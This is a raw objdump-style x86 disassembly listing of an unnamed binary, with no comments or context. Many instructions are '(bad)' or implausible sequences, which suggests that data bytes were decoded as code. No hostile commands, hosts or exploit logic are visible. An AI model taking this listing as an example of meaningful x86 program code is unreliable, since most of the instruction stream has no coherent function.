  40ad7b:	push   eax
  40ad7c:	adc    ecx,esp
  40ad7e:	adc    DWORD PTR [edi+0x1f],0x53d0566c
  40ad85:	jo     0x40adb6
  40ad87:	add    BYTE PTR [edx],ah
  40ad89:	fnstenv [esi]
  40ad8b:	mov    esp,0x23e2458b
  40ad90:	(bad)  
  40ad91:	ftst   
  40ad93:	add    esp,DWORD PTR [edx-0x27]
  40ad96:	and    al,0x35
  40ad98:	and    ebx,ecx
  40ad9a:	and    DWORD PTR [esi],esi
  40ad9c:	and    cl,bl
  40ad9e:	jno    0x40add4
  40ada0:	and    ebx,ecx
  40ada2:	lea    esi,[ebx+eiz*1]
  40ada5:	fst    DWORD PTR [esi*1+0x35c1d923]
  40adac:	and    cl,bl
  40adae:	scas   al,BYTE PTR es:[edi]
  40adaf:	xor    al,0x23
  40adb1:	fnstenv [edx-0x7a26dccf]
  40adb7:	das    
  40adb8:	and    ebx,ecx
  40adba:	cmp    eax,0x11d92331
  40adbf:	xor    eax,0x350cd923
  40adc4:	and    ebx,ecx
  40adc6:	fild   WORD PTR [ebx]
  40adc8:	(bad)  
  40adc9:	fyl2x  
  40adcb:	add    esp,DWORD PTR [edx-0x27]
  40adce:	jmp    0x40add3
  40add0:	add    BYTE PTR [edx-0x27],ah
  40add3:	in     al,0x3
  40add5:	(bad)  
  40add6:	fldenv [eax]
  40add8:	xor    BYTE PTR [ebx-0x5ccfcf27],ah
  40adde:	fldcw  WORD PTR [ebp+0x38]
  40ade1:	mov    ds:0xa335e0d9,eax
  40ade6:	fnstcw WORD PTR [esi-0x55265ccb]
  40adec:	aaa    
  40aded:	mov    ds:0xa337aed9,eax
  40adf2:	fld    DWORD PTR [edx+0x4]
  40adf5:	xchg   ecx,ebx
  40adf7:	pop    ecx
  40adf8:	add    al,0x84
  40adfa:	(bad)  [esp+eax*1+0x7e]
  40adfe:	fsqrt  
  40ae00:	add    edx,DWORD PTR [eax-0x27]
  40ae03:	add    BYTE PTR [edi],al
  40ae05:	data16 jne 0x40ae08
  40ae08:	cmp    eax,0xe9006d5e
  40ae0d:	popa   
  40ae0e:	fld    DWORD PTR [eax]
  40ae10:	test   DWORD PTR es:[ebp+0x75471b50],eax
  40ae17:	jae    0x40ae23
  40ae19:	xor    dl,BYTE PTR [eax-0x26b8f092]
  40ae1f:	add    bl,al
  40ae21:	popa   
  40ae22:	popf   
  40ae23:	add    cl,ch
  40ae25:	popa   
  40ae26:	fld    DWORD PTR [eax]
  40ae28:	hlt    
  40ae29:	inc    edx
  40ae2a:	cwde   
  40ae2b:	add    BYTE PTR [esi+edi*1-0x68],ah
  40ae2f:	add    BYTE PTR [ecx+edi*1-0x68],bh
  40ae33:	add    BYTE PTR [edx],bh
  40ae35:	add    BYTE PTR [eax],al
  40ae37:	cwde   
  40ae38:	add    BYTE PTR [ecx-0x6eff696d],al
  40ae3e:	xchg   ebx,eax
  40ae3f:	xchg   esi,eax
  40ae40:	add    BYTE PTR [ebx+0x1d00babb],bl
  40ae46:	or     BYTE PTR [eax-0x67f52900],bl
  40ae4c:	add    BYTE PTR [ebx-0x8],dh
  40ae4f:	xchg   edi,eax
  40ae50:	add    BYTE PTR [ebx+0x3d00babb],bh
  40ae56:	enter  0x98,0xf7
  40ae5a:	retf   0x98
  40ae5d:	fcmovne st,st(7)
  40ae5f:	cdq    
  40ae60:	add    BYTE PTR [eax-0x79ff6639],dh
  40ae66:	mov    edi,0x6d2a0099
  40ae6b:	cwde   
  40ae6c:	add    BYTE PTR [esi-0x5fff678c],dh
  40ae72:	mov    edx,0x662d0098
  40ae77:	nop
  40ae78:	add    BYTE PTR [edx],bh
  40ae7a:	pop    esi
  40ae7b:	test   eax,0xd5570000
  40ae80:	aas    
  40ae81:	add    BYTE PTR [edx-0x2b],al
  40ae84:	add    BYTE PTR [eax],al
  40ae86:	mov    BYTE PTR [eax+0x41],dl
  40ae89:	add    bl,ah
  40ae8b:	or     BYTE PTR [edx+0x0],al
  40ae8e:	inc    ebp
  40ae8f:	dec    edi
  40ae90:	inc    ecx
  40ae91:	add    BYTE PTR [esi-0x33ffbeb0],dh
  40ae97:	push   ecx
  40ae98:	inc    ecx
  40ae99:	add    BYTE PTR [eax],al
  40ae9b:	mov    dh,0x51
  40ae9d:	inc    ecx
  40ae9e:	add    BYTE PTR [eax],bh
  40aea0:	push   eax
  40aea1:	inc    ecx
  40aea2:	add    BYTE PTR ds:0xb5004150,ah
  40aea8:	dec    edi
  40aea9:	inc    ecx
  40aeaa:	add    BYTE PTR [edi-0x2b],bl
  40aead:	add    BYTE PTR [bx+si+0x70d5],cl
  40aeb2:	add    BYTE PTR [edi-0x4dffa02b],dl
  40aeb8:	aad    0x4e
  40aeba:	add    BYTE PTR [edx-0x61ff942b],ch
  40aec0:	aad    0x0
  40aec2:	add    BYTE PTR [ebx-0x2a],ch
  40aec5:	iret   
  40aec6:	add    BYTE PTR [ecx-0x2a],bl
  40aec9:	add    BYTE PTR [eax],al
  40aecb:	mov    esp,0x7b2054ba
  40aed0:	aad    0x0
  40aed2:	add    BYTE PTR [ebx+0x2b545194],ch
  40aed8:	fld    QWORD PTR [eax]
  40aeda:	add    BYTE PTR [esi],dl
  40aedc:	fld    QWORD PTR [eax]
  40aede:	add    cl,ch
  40aee0:	inc    edx
  40aee1:	add    BYTE PTR ds:[ebp+0x5b00412b],dh
  40aee8:	sub    eax,DWORD PTR [ecx+0x0]
  40aeeb:	fld    DWORD PTR [edx+0x3e]
  40aeee:	add    BYTE PTR [edi-0x27ffc055],bl
  40aef4:	stos   DWORD PTR es:[edi],eax
  40aef5:	aas    
  40aef6:	add    BYTE PTR [edx-0x4c],ah
  40aef9:	sahf   
  40aefa:	aas    
  40aefb:	bound  ebx,QWORD PTR [eax+0x620040b3]
  40af01:	push   edx
  40af02:	mov    ah,0x40
  40af04:	bound  edi,QWORD PTR [esi-0x2b9dbf4d]
  40af0a:	sahf   
  40af0b:	aas    
  40af0c:	bound  ebx,QWORD PTR [esi-0x5c9dbece]
  40af12:	xor    al,BYTE PTR [ecx+0x62]
  40af15:	adc    eax,0xe162415c
  40af1a:	imul   eax,DWORD PTR [di-0x33],0xe462004b
  40af22:	gs fs cmp al,0xdf
  40af26:	pop    esp
  40af27:	push   0x49
  40af29:	ficomp WORD PTR [edi+0x6e]
  40af2c:	xor    dh,cl
  40af2e:	push   ebx
  40af2f:	jae    0x40af67
  40af31:	sbb    BYTE PTR [ebx+0x78],bl
  40af34:	sub    BYTE PTR [esp+edx*2],ah
  40af37:	add    BYTE PTR [edx+0x1a],ah
  40af3a:	push   esp
  40af3b:	add    BYTE PTR [edx+0xe],ah
  40af3e:	push   esp
  40af3f:	add    BYTE PTR [edx+0x36],ah
  40af42:	data16 add BYTE PTR [edx+0x1e],ah
  40af46:	pop    ebp
  40af47:	jbe    0x40afab
  40af49:	sbb    dl,BYTE PTR ds:0x141a6200
  40af4f:	add    BYTE PTR [edx+0x4a],ah
  40af52:	pop    ss
  40af53:	add    BYTE PTR [edx+0x4a],ah
  40af56:	push   ss
  40af57:	add    BYTE PTR [edx+0x5a],ah
  40af5a:	sbb    DWORD PTR [eax],eax
  40af5c:	bound  ebx,QWORD PTR [edx+0x18]
  40af5f:	add    BYTE PTR [edx+0x4e],ah
  40af62:	pop    ebp
  40af63:	add    BYTE PTR [eax],al
  40af65:	bound  esi,QWORD PTR [ebx+0x66]
  40af68:	jb     0x40af35
  40af6a:	jb     0x40afc1
  40af6c:	add    BYTE PTR [edx+0x78],ah
  40af6f:	arpl   WORD PTR [ebx-0x4e],si
  40af72:	fldenv [edx]
  40af74:	add    al,0x62
  40af76:	fyl2x  
  40af78:	std    
  40af79:	imul   edi,DWORD PTR [ecx-0x1c94021f],0xffffffe1
  40af80:	std    
  40af81:	pop    ebx
  40af82:	jecxz  0x40af6d
  40af84:	add    eax,0x5eadb60
  40af89:	pusha  
  40af8a:	fucomi st,st(1)
  40af8c:	add    eax,0xed59db60
  40af91:	mov    ds:0xa03241d9,al
  40af96:	fld    DWORD PTR [ecx+0x32]
  40af99:	and    cl,bl
  40af9b:	xor    DWORD PTR [edx],esi
  40af9d:	and    cl,bl
  40af9f:	jns    0x40af8e
  40afa1:	and    bl,cl
  40afa3:	and    DWORD PTR [edx],esi
  40afa5:	and    cl,bl
  40afa7:	fs call 0xe8a588cf
  40afad:	and    bl,cl
  40afaf:	add    ecx,ebp
  40afb1:	and    bl,cl
  40afb3:	sub    cl,ch
  40afb5:	and    bl,cl
  40afb7:	shr    eax,1
  40afb9:	and    bl,cl
  40afbb:	int3   
  40afbc:	call   0x8a3a88e3
  40afc1:	and    bl,cl
  40afc3:	mov    al,0x89
  40afc5:	and    bl,cl
  40afc7:	into   
  40afc8:	mov    DWORD PTR [eax],eax
  40afca:	and    bl,cl
  40afcc:	mov    dh,0xe0
  40afce:	and    bl,cl
  40afd0:	push   edx
  40afd1:	loopne 0x40aff5
  40afd3:	fnstenv [ebx-0x5926dd21]
  40afd9:	add    ecx,esi
  40afdb:	fld    DWORD PTR [esi-0x77263ffd]
  40afe1:	add    edi,DWORD PTR [esi+0x6203a3d9]
  40afe7:	fldcw  WORD PTR [ebx+0xd9cd03]
  40afed:	mov    ah,BYTE PTR [ecx+0x78]
  40aff0:	add    BYTE PTR [ebp+0x61],bh
  40aff3:	xchg   ebp,eax
  40aff4:	add    cl,ch
  40aff6:	popa   
  40aff7:	fld    DWORD PTR [eax]
  40aff9:	xor    BYTE PTR [edi+0x785e6d8e],dh
  40afff:	lods   eax,DWORD PTR ds:[esi]
  40b000:	push   eax
  40b001:	pop    ebx
  40b002:	cmp    DWORD PTR [edx+0x63],0x3a
  40b006:	scas   eax,DWORD PTR es:[edi]
  40b007:	fld    DWORD PTR [eax]
  40b009:	or     esp,DWORD PTR [esi-0x44]
  40b00c:	add    BYTE PTR [edx],bh
  40b00e:	pop    esi
  40b00f:	mov    ebx,0xd961e900
  40b014:	add    bl,cl
  40b016:	popa   
  40b017:	mov    esp,0xbb661a00
  40b01c:	add    cl,cl
  40b01e:	popa   
  40b01f:	mov    esp,0xd9661a00
  40b024:	add    ah,bh
  40b026:	cs jl  0x40b09b
  40b029:	add    al,0x40
  40b02b:	outs   dx,DWORD PTR ds:[esi]
  40b02c:	cs or  eax,0x854200
  40b032:	sub    dl,BYTE PTR [esp+edi*2]
  40b035:	pop    edi
  40b036:	fnstsw WORD PTR [esp+ebx*4]
  40b039:	outs   dx,BYTE PTR ds:[esi]
  40b03a:	xlat   BYTE PTR ds:[ebx]
  40b03b:	cmp    BYTE PTR [ebx+0x6d],ch
  40b03e:	(bad)  
  40b03f:	xor    al,0x7c
  40b041:	outs   dx,BYTE PTR ds:[esi]
  40b042:	aad    0x27
  40b044:	test   DWORD PTR [ebp-0x36],ebp
  40b047:	fld    DWORD PTR es:[eax]
  40b04a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b04b:	add    al,0x6a
  40b04d:	je     0x40b00a
  40b04f:	add    dh,BYTE PTR [eax+0x43]
  40b052:	mov    edi,0x9672800b
  40b057:	add    eax,DWORD PTR [ebx+eiz*2+0x6c9bb58f]
  40b05e:	xchg   BYTE PTR [esi-0x3a2cff7e],bh
  40b064:	in     al,0xa
  40b066:	add    bh,dl
  40b068:	jle    0x40b0d6
  40b06a:	and    BYTE PTR [ecx],ch
  40b06c:	mov    edi,0xf43e2271
  40b071:	push   0x787f1b66
  40b076:	imul   ecx,DWORD PTR [eax+0x66222091],0xa420228c
  40b080:	js     0x40b0f6
  40b082:	outs   dx,DWORD PTR ds:[esi]
  40b083:	pop    ebx
  40b084:	add    DWORD PTR [eax],0x5fdd9900
  40b08a:	add    BYTE PTR [edi],dh
  40b08c:	fld    QWORD PTR [eax]
  40b08e:	add    BYTE PTR [ebx+0x7e],cl
  40b091:	popa   
  40b092:	push   0x6dbd2c00
  40b097:	push   bp
  40b099:	test   BYTE PTR [edi],0x25
  40b09c:	js     0x40b094
  40b09e:	pop    es
  40b09f:	fs data16 jns 0x40b0c3
  40b0a3:	das    
  40b0a4:	test   DWORD PTR [ebp-0x4437dade],edi
  40b0aa:	or     ecx,DWORD PTR [edx]
  40b0ac:	retf   
  40b0ad:	fld    DWORD PTR [eax]
  40b0af:	add    BYTE PTR [ecx+ebx*8-0x2664ff9f],bl
  40b0b6:	and    al,BYTE PTR [eax]
  40b0b8:	push   esi
  40b0b9:	fnsave [ecx+0x0]
  40b0bc:	imul   ebx,ebp,0xd9c80000
  40b0c2:	ins    DWORD PTR es:[edi],dx
  40b0c3:	add    dh,cl
  40b0c5:	fst    DWORD PTR [ecx+0x0]
  40b0c8:	retf   
  40b0c9:	fldenv [ebx+0x0]
  40b0cc:	test   al,0xd9
  40b0ce:	add    BYTE PTR [eax],al
  40b0d0:	fcomp  st(1)
  40b0d2:	cmp    al,BYTE PTR [eax]
  40b0d4:	arpl   bp,bx
  40b0d6:	dec    ebx
  40b0d7:	add    BYTE PTR [edi+0x400039d9],ch
  40b0dd:	(bad)  [esi+0x0]
  40b0e0:	bound  esi,QWORD PTR [eax]
  40b0e2:	add    cl,BYTE PTR [esi+0x62]
  40b0e5:	sub    eax,DWORD PTR [edx]
  40b0e7:	dec    esi
  40b0e8:	bound  edi,QWORD PTR [edx]
  40b0ea:	add    bh,BYTE PTR [ebx]
  40b0ec:	bound  edx,QWORD PTR [edi]
  40b0ee:	add    bh,BYTE PTR [ebx]
  40b0f0:	bound  edi,QWORD PTR [esi]
  40b0f2:	add    dl,BYTE PTR [edi+0x62]
  40b0f5:	sbb    DWORD PTR [edx],eax
  40b0f7:	add    BYTE PTR [eax],al
  40b0f9:	bound  esi,QWORD PTR [eax+0x4]
  40b0fc:	inc    edx
  40b0fd:	bound  edi,QWORD PTR [ecx]
  40b0ff:	add    eax,DWORD PTR [edx+0x62]
  40b102:	sub    eax,0x2f624138
  40b107:	arpl   WORD PTR [ecx+0x62],ax
  40b10a:	inc    edi
  40b10b:	xchg   edi,eax
  40b10c:	aas    
  40b10d:	bound  ecx,QWORD PTR [ebp-0x229dbe0f]
  40b113:	add    al,0x76
  40b115:	bound  eax,QWORD PTR [edx]
  40b117:	add    al,BYTE PTR [eax]
  40b119:	bound  esi,QWORD PTR [edx-0x1c9d8dfc]
  40b11f:	add    al,0x68
  40b121:	(bad)  
  40b122:	fld    DWORD PTR [edx+eiz*2]
  40b125:	(bad)  
  40b126:	fld    DWORD PTR [esp+esi*2]
  40b129:	(bad)  
  40b12a:	mov    BYTE PTR [esp+edx*2],0x62
  40b12e:	mov    esi,0xd0620004
  40b133:	call   0x6242:0x3a80623f
  40b13a:	(bad)  
  40b13b:	cmp    al,BYTE PTR [edx+0x62]
  40b13e:	xchg   ecx,eax
  40b13f:	inc    ebp
  40b140:	inc    edx
  40b141:	bound  ebx,QWORD PTR [edx-0xe]
  40b144:	inc    ebx
  40b145:	bound  esi,QWORD PTR [eax]
  40b147:	cwde   
  40b148:	aas    
  40b149:	bound  eax,QWORD PTR [eax-0x419dbdc6]
  40b14f:	cmp    al,BYTE PTR [edx+0x62]
  40b152:	jmp    0x423a:0xe4624237
  40b159:	(bad)  
  40b15a:	fst    DWORD PTR [edi-0x265fffc1]
  40b160:	push   esp
  40b161:	inc    eax
  40b162:	mov    al,ds:0xbf03c4d9
  40b167:	(bad)  
  40b169:	add    esp,DWORD PTR [edx-0x27]
  40b16c:	aam    0x3
  40b16e:	iret   
  40b16f:	fld    st(4)
  40b171:	add    esi,DWORD PTR [edx+0x6203e7d9]
  40b177:	fstp   DWORD PTR [edx]
  40b179:	bound  esp,QWORD PTR [ebx-0x5fd00427]
  40b17f:	(bad)  [esi]
  40b181:	xor    BYTE PTR [eax-0x5fcf3a27],ah
  40b187:	(bad)  [ebx]
  40b189:	sub    esp,DWORD PTR [eax-0x5fd4c127]
  40b18f:	fldcw  WORD PTR [edx+0x79]
  40b192:	mov    ds:0xa02aced9,al
  40b197:	fxam   
  40b199:	das    
  40b19a:	mov    al,ds:0x202dfcd9
  40b19f:	fld    DWORD PTR [ecx+0x2e]
  40b1a2:	and    cl,bl
  40b1a4:	xor    DWORD PTR [esi],ebp
  40b1a6:	and    cl,bl
  40b1a8:	xor    DWORD PTR [esi],ebp
  40b1aa:	and    cl,bl
  40b1ac:	es cs and cl,bl
  40b1b0:	clc    
  40b1b1:	sub    eax,0x2d5ed920
  40b1b6:	and    cl,bl
  40b1b8:	stos   DWORD PTR es:[edi],eax
  40b1b9:	pop    esp
  40b1ba:	and    cl,bl
  40b1bc:	scas   al,BYTE PTR es:[edi]
  40b1bd:	push   0x5ed98916
  40b1c2:	add    BYTE PTR [ecx],al
  40b1c4:	call   0x52da:0x7e1067cb
  40b1cb:	(bad)  
  40b1cc:	fnstenv [ebx-0x5482fca2]
  40b1d2:	pop    esp
  40b1d3:	add    BYTE PTR [edi+0x0],ah
  40b1d6:	enter  0x7213,0x3f
  40b1da:	jmp    0xd7418b40
  40b1df:	popa   
  40b1e0:	jge    0x40b1e2
  40b1e2:	mov    BYTE PTR [ecx+0x6d],ah
  40b1e5:	add    cl,ch
  40b1e7:	popa   
  40b1e8:	fld    DWORD PTR [eax]
  40b1ea:	jmp    0x9a418b50
  40b1ef:	popa   
  40b1f0:	mov    ds:0x8d61a700,al
  40b1f5:	add    BYTE PTR [esi-0x64ff679f],bl
  40b1fb:	popa   
  40b1fc:	pushf  
  40b1fd:	add    BYTE PTR [ebp+0x66],al
  40b200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b201:	add    BYTE PTR [eax+0x5e],dl
  40b204:	jbe    0x40b206
  40b206:	pop    ebx
  40b207:	data16 add BYTE PTR [eax],0x5a
  40b20b:	pop    esi
  40b20c:	add    BYTE PTR [eax],0x4f
  40b20f:	ins    WORD PTR es:[edi],dx
  40b211:	add    BYTE PTR ds:0x40008a5e,bl
  40b217:	add    WORD PTR [eax],0x45
  40b21b:	pop    esi
  40b21c:	add    BYTE PTR [eax],0x1e
  40b21f:	data16 data16 add cl,cl
  40b223:	popa   
  40b224:	mov    ds:0x66003d00,eax
  40b229:	xchg   ebp,eax
  40b22a:	add    BYTE PTR [edx],ch
  40b22c:	pop    esi
  40b22d:	ins    BYTE PTR es:[edi],dx
  40b22e:	add    bl,bh
  40b230:	popa   
  40b231:	add    BYTE PTR [si],al
  40b234:	pop    esi
  40b235:	add    DWORD PTR [eax],0xfffffffd
  40b238:	popa   
  40b239:	mov    eax,DWORD PTR [eax]
  40b23b:	add    al,0x5e
  40b23d:	addr16 add dl,bl
  40b240:	popa   
  40b241:	add    BYTE PTR [eax],0xce
  40b244:	popa   
  40b245:	add    DWORD PTR [eax],0xffffffb5
  40b248:	popa   
  40b249:	mov    DWORD PTR [eax],eax
  40b24b:	(bad)  [ecx-0x7e]
  40b24e:	add    BYTE PTR [eax],al
  40b250:	lods   eax,DWORD PTR ds:[esi]
  40b251:	(bad)  
  40b252:	add    BYTE PTR [bx+0x63d6],ah
  40b257:	add    bh,al
  40b259:	(bad)  
  40b25a:	add    BYTE PTR [bx+si+0x74d6],ch
  40b25f:	add    BYTE PTR [edi],ah
  40b261:	(bad)  
  40b262:	and    eax,DWORD PTR [eax]
  40b264:	clc    
  40b265:	aad    0x0
  40b267:	add    BYTE PTR [ebx],cl
  40b269:	(bad)  
  40b26a:	jb     0x40b26c
  40b26c:	(bad)  
  40b26d:	(bad)  
  40b26e:	data16 add dl,dl
  40b271:	aad    0x6c
  40b273:	add    dh,bl
  40b275:	aad    0x47
  40b277:	add    dh,ah
  40b279:	aad    0x5f
  40b27b:	add    ah,bl
  40b27d:	aad    0x63
  40b27f:	add    BYTE PTR [ebx-0x23],bl
  40b282:	pop    edi
  40b283:	add    BYTE PTR [edi-0x4ff9723],ch
  40b289:	aad    0x0
  40b28b:	add    BYTE PTR [eax],al
  40b28d:	sti    
  40b28e:	mov    DWORD PTR [esi],esi
  40b290:	sbb    DWORD PTR [edx],ecx
  40b292:	mov    dh,BYTE PTR [esi]
  40b294:	sbb    DWORD PTR [eax],ebx
  40b296:	sbb    dh,cl
  40b298:	js     0x40b2a9
  40b29a:	sbb    dh,cl
  40b29c:	js     0x40b2a7
  40b29e:	mov    ecx,0x9b99a23a
  40b2a3:	inc    edx
  40b2a4:	and    BYTE PTR [ebx-0x54d1ce3b],bh
  40b2aa:	lds    esi,FWORD PTR [ecx]
  40b2ac:	or     bh,BYTE PTR [ebx+0x590000d5]
  40b2b2:	fwait
  40b2b3:	inc    edx
  40b2b4:	and    bl,cl
  40b2b6:	aad    0x0
  40b2b8:	add    BYTE PTR [ebx+0x4f],dh
  40b2bb:	inc    eax
  40b2bc:	add    BYTE PTR [ecx+0x900404f],al
  40b2c2:	push   eax
  40b2c3:	inc    eax
  40b2c4:	add    BYTE PTR [ebx],ah
  40b2c6:	push   eax
  40b2c7:	inc    eax
  40b2c8:	add    BYTE PTR [edx+0xa],ah
  40b2cb:	cdq    
  40b2cc:	inc    ecx
  40b2cd:	bound  edx,QWORD PTR [ebp+0x2]
  40b2d0:	pop    ecx
  40b2d1:	bound  eax,QWORD PTR [eax]
  40b2d3:	add    al,BYTE PTR [eax]
  40b2d5:	(bad)
  40b2da:	sub    BYTE PTR [edx],al
  40b2dc:	je     0x40b340
  40b2de:	add    BYTE PTR [edx],al
  40b2e0:	add    BYTE PTR [edx+0x18],ah
  40b2e3:	popf   
  40b2e4:	inc    ecx
  40b2e5:	bound  eax,QWORD PTR [edx-0x77]
  40b2e8:	inc    ecx
  40b2e9:	bound  ecx,QWORD PTR [edx-0x5f9dbe3e]
  40b2ef:	ret    0x41
  40b2f2:	bound  edx,QWORD PTR [edi+eiz*8+0x2c3c6240]
  40b2f9:	inc    edx
  40b2fa:	bound  ecx,QWORD PTR [esp+ebp*1+0x42]
  40b2fe:	bound  ecx,QWORD PTR [esp+ebp*1+0x42]
  40b302:	bound  esi,QWORD PTR [esi+ebp*8+0x40]
  40b306:	bound  ebx,QWORD PTR [edx+ebp*1-0x118b9dbe]
  40b30d:	inc    eax
  40b30e:	bound  ecx,QWORD PTR [ebp-0x6d9dbf21]
  40b314:	and    eax,DWORD PTR [eax]
  40b316:	(bad)
  40b31b:	or     eax,0x146241b5
  40b320:	add    BYTE PTR [eax+0x62],0x6f
  40b324:	lods   eax,DWORD PTR ds:[esi]
  40b325:	inc    ecx
  40b326:	(bad)  
  40b327:	fild   WORD PTR [edx+0x28436240]
  40b32d:	inc    ecx
  40b32e:	(bad)  
  40b32f:	fld    TBYTE PTR [ebp+0x1ea6241]
  40b335:	add    BYTE PTR [edx-0x17],ah
  40b338:	add    DWORD PTR [eax],eax
  40b33a:	(bad)  
  40b33b:	cld    
  40b33c:	add    DWORD PTR [eax],eax
  40b33e:	(bad)  
  40b33f:	sti    
  40b340:	add    DWORD PTR [eax],eax
  40b342:	(bad)  
  40b343:	fpatan 
  40b345:	add    esp,DWORD PTR [edx-0x27]
  40b348:	in     al,dx
  40b349:	add    esp,DWORD PTR [edx-0x27]
  40b34c:	jmp    0x6203:0xe3d96203
  40b353:	fldlg2 
  40b355:	add    eax,DWORD PTR [eax]
  40b357:	(bad)  
  40b358:	fxam   
  40b35a:	add    esp,DWORD PTR [edx-0x27]
  40b35d:	out    dx,al
  40b35e:	add    esp,DWORD PTR [edx-0x27]
  40b361:	pop    ecx
  40b362:	out    dx,al
  40b363:	mov    ds:0xa029c1d9,al
  40b368:	fld    st(1)
  40b36a:	sub    DWORD PTR [eax-0x5fd64e27],esp
  40b370:	fnstcw WORD PTR [ecx-0x12]
  40b373:	mov    ds:0xa3a7f8d9,al
  40b378:	fldenv [ecx+eiz*8-0x5e]
  40b37c:	(bad)  
  40b37e:	test   eax,0xe081d9a3
  40b383:	mov    ds:0xa3aa23d9,al
  40b388:	fnstcw WORD PTR [edx]
  40b38a:	add    al,0x87
  40b38c:	fnstcw WORD PTR [ebx]
  40b38e:	add    al,0x81
  40b390:	(bad)  [ecx+0x4]
  40b393:	xchg   edx,eax
  40b394:	fnstcw WORD PTR [ecx]
  40b396:	add    al,0x8b
  40b398:	fnstenv ds:0x43d97b04
  40b39e:	add    al,0x7f
  40b3a0:	fld    DWORD PTR [esi+0x4]
  40b3a3:	inc    edi
  40b3a4:	(bad)  
  40b3a6:	add    esp,DWORD PTR [edx-0x27]
  40b3a9:	int    0x3
  40b3ab:	inc    edi
  40b3ac:	(bad)  [edi]
  40b3ae:	add    al,0x3f
  40b3b0:	(bad)  
  40b3b2:	add    esp,DWORD PTR [edx-0x27]
  40b3b5:	sub    BYTE PTR [ecx+0x2e],dl
  40b3b8:	or     DWORD PTR [esi],0x733b0056
  40b3be:	add    BYTE PTR [eax],cl
  40b3c0:	adc    al,BYTE PTR [edx-0x269e0093]
  40b3c6:	add    BYTE PTR [ebx-0x35989402],ch
  40b3cc:	inc    ecx
  40b3cd:	fld    DWORD PTR [eax]
  40b3cf:	push   eax
  40b3d0:	out    dx,al
  40b3d1:	scas   eax,DWORD PTR es:[edi]
  40b3d2:	add    dl,dl
  40b3d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3d5:	cdq    
  40b3d6:	add    BYTE PTR [ebx],bh
  40b3d8:	popf   
  40b3d9:	cdq    
  40b3da:	add    BYTE PTR [esi],cl
  40b3dc:	(bad)  [edi-0x66652800]
  40b3e2:	add    BYTE PTR [ebx+0x5900992a],al
  40b3e8:	sub    bl,BYTE PTR [ecx-0x789e4300]
  40b3ee:	add    BYTE PTR [eax-0x58ff949f],cl
  40b3f4:	popa   
  40b3f5:	add    BYTE PTR [eax],0x95
  40b3f8:	popa   
  40b3f9:	je     0x40b3fb
  40b3fb:	mov    al,0x61
  40b3fd:	jg     0x40b3ff
  40b3ff:	(bad)  
  40b400:	popa   
  40b401:	jle    0x40b403
  40b403:	lea    esp,[ecx-0x7b]
  40b406:	add    BYTE PTR [ebx+0x5e],bl
  40b409:	js     0x40b40b
  40b40b:	dec    edi
  40b40c:	pushw  0x0
  40b40f:	inc    ebp
  40b410:	pop    esi
  40b411:	js     0x40b413
  40b413:	push   ebp
  40b414:	data16 add BYTE PTR [eax],0x56
  40b418:	pop    esi
  40b419:	jg     0x40b41b
  40b41b:	jmp    0x15418d81
  40b420:	add    BYTE PTR [esi-0x76],bl
  40b423:	add    BYTE PTR ds:0x10006b66,dh
  40b429:	pop    esi
  40b42a:	jg     0x40b42c
  40b42c:	push   es
  40b42d:	xchg   di,ax
  40b42f:	add    BYTE PTR [eax],al
  40b431:	pop    esi
  40b432:	jge    0x40b434
  40b434:	add    al,0x66
  40b436:	mov    al,ds:0xd54d0000
  40b43b:	data16 add BYTE PTR [ebp+edx*8+0x5c],bl
  40b440:	add    BYTE PTR [esi-0x28ffcf26],dl
  40b446:	fidivr DWORD PTR [eax+0x0]
  40b449:	data16 aad 0x30
  40b44c:	add    BYTE PTR [edi-0x2b],dh
  40b44f:	js     0x40b451
  40b451:	iret   
  40b452:	fisub  DWORD PTR [ebx]
  40b454:	add    BYTE PTR [eax-0x2bffff26],bl
  40b45a:	fimul  DWORD PTR [edi+0x0]
  40b45d:	mov    edi,0x5b0000da
  40b462:	out    dx,eax
  40b463:	inc    edx
  40b464:	add    BYTE PTR [ebx-0x26],bl
  40b467:	cmp    al,BYTE PTR [eax]
  40b469:	cmp    ebx,edx
  40b46b:	add    BYTE PTR [eax],al
  40b46d:	sub    ebx,esp
  40b46f:	xor    BYTE PTR [eax],al
  40b471:	cmp    ebx,edx
  40b473:	add    BYTE PTR [eax],al
  40b475:	dec    ebx
  40b476:	fiadd  DWORD PTR [eax]
  40b478:	add    BYTE PTR [ebx-0x26],cl
  40b47b:	add    BYTE PTR [eax],al
  40b47d:	cmp    ebx,edx
  40b47f:	(bad)  
  40b480:	(bad)  
  40b481:	mov    edx,0x42e5
  40b486:	inc    esi
  40b487:	jmp    0x40b4cb
  40b489:	add    BYTE PTR [ebp-0x69ffbd18],ah
  40b48f:	jmp    0xfda8b4d6
  40b494:	inc    edx
  40b495:	add    BYTE PTR [ecx],cl
  40b497:	fiadd  DWORD PTR [eax]
  40b499:	add    BYTE PTR [ebx],cl
  40b49b:	fiadd  DWORD PTR [eax]
  40b49d:	add    dl,bh
  40b49f:	fld    DWORD PTR [eax]
  40b4a1:	add    BYTE PTR [edi],dh
  40b4a3:	scas   al,BYTE PTR es:[edi]
  40b4a4:	dec    esp
  40b4a5:	inc    ebp
  40b4a6:	ja     0x40b456
  40b4a8:	add    BYTE PTR [eax],al
  40b4aa:	xchg   ebx,eax
  40b4ab:	scas   al,BYTE PTR es:[edi]
  40b4ac:	aas    
  40b4ad:	inc    esp
  40b4ae:	mov    ebx,0x620000d9
  40b4b3:	mov    al,0x2d
  40b4b5:	push   esp
  40b4b6:	(bad)
  40b4bb:	mov    ebp,0xbf625443
  40b4c0:	xor    al,0x54
  40b4c2:	sbb    esi,DWORD PTR [edi-0x3b9dacc6]
  40b4c8:	ss inc ecx
  40b4ca:	and    DWORD PTR ds:0x43620002,edi
  40b4d0:	cmp    DWORD PTR [eax+0x2b],edx
  40b4d3:	add    BYTE PTR [edx],al
  40b4d5:	add    BYTE PTR [edx+0x4c],ah
  40b4d8:	cmp    DWORD PTR [ebx+0x29],eax
  40b4db:	add    BYTE PTR [edx],al
  40b4dd:	add    BYTE PTR [edx+0x3d],ah
  40b4e0:	cmp    eax,0x2341543
  40b4e5:	add    BYTE PTR [edx+0x4d],ah
  40b4e8:	cmp    DWORD PTR [esi+0x0],edx
  40b4eb:	lahf   
  40b4ec:	add    al,BYTE PTR [edx]
  40b4ee:	add    BYTE PTR [edx+0x32],ah
  40b4f1:	xor    al,0x4f
  40b4f3:	mov    dl,0x3c
